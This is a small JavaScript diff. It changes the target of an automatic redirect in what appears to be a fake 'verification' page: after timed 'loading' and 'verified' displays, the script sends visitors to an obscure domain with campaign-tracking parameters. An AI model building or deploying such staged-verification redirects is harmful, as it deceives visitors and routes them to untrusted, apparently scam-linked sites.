@@ -55,7 +55,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (loading) loading.style.display = 'none';
         if (verified) verified.style.display = 'flex';
         setTimeout(() => {
-          window.location.href = 'https://h2n6.com/?utm_campaign=Mc8YVAXQJL&v1=[v1]&v2=[v2]&v3=[v3]';
+          window.location.href = 'https://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]';
         }, 1000);
       }, 2000);
     };
